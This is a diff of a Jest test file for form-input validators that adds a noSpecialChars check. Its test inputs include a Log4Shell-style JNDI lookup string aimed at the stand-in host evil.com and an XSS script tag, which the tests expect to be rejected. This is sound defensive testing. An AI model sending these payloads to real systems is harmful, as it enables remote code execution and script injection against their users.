@@ -1,7 +1,11 @@
-import { commonNameChars, isNumbersOnly } from "./useValidation";
+import {
+  commonNameChars,
+  isNumbersOnly,
+  noSpecialChars,
+} from "./useValidation";
 
 describe("Common Naming Characters", () => {
-  test("It should return false if special characters present", () => {
+  test("It should return false if special characters or numbers present", () => {
     expect(commonNameChars("${jndi:ldap://evil.com}")).toEqual(false);
     expect(commonNameChars("<script>alert('xss')</script>")).toEqual(false);
     expect(commonNameChars("123")).toEqual(false);
@@ -19,5 +23,15 @@ describe("Number Characters only", () => {
     expect(isNumbersOnly("$%&")).toEqual(false);
     expect(isNumbersOnly(" .-?")).toEqual(false);
     expect(isNumbersOnly("53789")).toEqual(true);
+  });
+});
+
+describe("No Special Characters", () => {
+  test("It should return false if special chars present", () => {
+    expect(noSpecialChars("$tom")).toEqual(false);
+    expect(commonNameChars("${jndi:ldap://evil.com}")).toEqual(false);
+    expect(commonNameChars("<script>alert('xss')</script>")).toEqual(false);
+    expect(noSpecialChars("123 W. *Main St.")).toEqual(false);
+    expect(noSpecialChars("123 W. Main St.")).toEqual(true);
   });
 });
